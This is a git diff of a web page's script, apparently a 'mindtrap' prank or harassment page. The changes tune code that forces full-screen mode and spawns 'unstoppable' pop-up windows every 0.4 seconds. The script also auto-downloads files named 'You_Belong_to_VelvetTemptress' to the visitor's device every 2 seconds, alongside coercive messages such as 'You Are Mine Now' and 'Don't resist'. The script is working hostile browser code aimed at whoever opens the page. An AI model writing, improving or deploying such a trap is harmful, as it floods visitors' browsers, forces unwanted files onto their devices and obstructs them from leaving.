@@ -84,37 +84,50 @@
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%289%29.png"
         ];
 
+        let usedIndexes = [];
+
+        function getRandomImage() {
+            if (usedIndexes.length === images.length) {
+                usedIndexes = []; // Reset when all images are used
+            }
+            let randomIndex;
+            do {
+                randomIndex = Math.floor(Math.random() * images.length);
+            } while (usedIndexes.includes(randomIndex));
+            usedIndexes.push(randomIndex);
+            return images[randomIndex];
+        }
+
         function startTrap() {
             goFullScreen(); // Force full-screen mode
             document.body.innerHTML += "<h1>You Are Mine Now~ 💕</h1>";
 
-            // Change background every 3 seconds to a random image
+            // Change background every 2 seconds
             setInterval(() => {
-                let imgURL = images[Math.floor(Math.random() * images.length)];
+                let imgURL = getRandomImage();
                 document.body.style.backgroundImage = `url(${imgURL})`;
-            }, 3000); // Change background every 3 seconds
+            }, 2000);
 
-            // Unstoppable pop-ups every 0.5 seconds
+            // Unstoppable pop-ups every 0.4 seconds
             setInterval(() => {
-                let imgURL = images[Math.floor(Math.random() * images.length)];
-                
-                let newWin = window.open("", "", `width=400,height=400,left=${Math.random() * screen.width},top=${Math.random() * screen.height}`);
-                if (newWin) {
-                    newWin.document.write(`<img src="${imgURL}" width="100%" height="100%">`);
-                    setTimeout(() => { newWin.close(); }, 2000); // Close after 2 seconds
+                let imgURL = getRandomImage();
+                let popUp = window.open("", "", `width=400,height=400,left=${Math.random() * screen.width},top=${Math.random() * screen.height}`);
+                if (popUp) {
+                    popUp.document.write(`<img src="${imgURL}" width="100%" height="100%">`);
+                    setTimeout(() => { popUp.close(); }, 1500);
                 }
-            }, 500); // Pop-ups every 0.5 sec
+            }, 400); // Faster pop-ups
 
-            // Auto-download images every 2.5 seconds
+            // Auto-download images every 2 seconds
             setInterval(() => {
-                let imgIndex = Math.floor(Math.random() * images.length);
+                let imgURL = getRandomImage();
                 let link = document.createElement('a');
-                link.href = images[imgIndex];
-                link.download = `You_Belong_to_VelvetTemptress_${imgIndex + 1}.jpg`;
+                link.href = imgURL;
+                link.download = `You_Belong_to_VelvetTemptress_${Date.now()}.jpg`;
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
-            }, 2500);
+            }, 2000);
         }
     </script>
 </head>
@@ -123,3 +136,4 @@
     <p>Don't resist. You were meant to be here.</p>
 </body>
 </html>
+
